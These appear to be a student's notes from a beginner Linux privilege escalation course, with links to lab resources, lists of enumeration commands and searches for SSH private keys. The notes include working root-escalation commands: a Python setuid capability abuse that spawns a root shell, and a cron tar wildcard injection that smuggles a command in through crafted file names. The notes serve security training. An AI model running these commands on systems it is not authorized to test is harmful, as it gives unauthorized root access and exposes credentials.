TCM-Sec Linux Privilege Escalation for beginner
================================================

Resources for this video:

https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources


https://tryhackme.com/room/linuxprivescarena



https://gtfobins.github.io/



Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Linux Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

Checklist - Linux Privilege Escalation - https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html



system enumeration
==================
#uname -a 
#lscpu
#ps aux | grep root



User Enumeration
=================
#whoami
#id
#sudo -l
#cat /etc/passwd

#locate password | more [Password Hunting]




Auto Enumeration Tools
======================

LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum - https://github.com/rebootuser/LinEnum

Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester

Linux Priv Checker - https://github.com/sleventyeleven/linuxprivchecker



Escalation via SSH KEY
----------------------

#find / -name authorized_keys 2> /dev/null

#find / -name id_rsa 2 > /dev/null



Escalation via Capabilities
---------------------------
#getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep

#/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'


Escalation via SUID
---------------------
#find / -perm -u=s -type f 2>/dev/null




Scheduled Tasks (Cron)
----------------------
#cat /etc/crontab
#echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/smn/backup/shell.sh
#chmod +x shell.sh
#touch /home/smn/backup/--checkpoint=1
#touch /home/smn/backup/--checkpoint-action=exec=sh\ shell.sh
#/tmp/bash -p [got root]

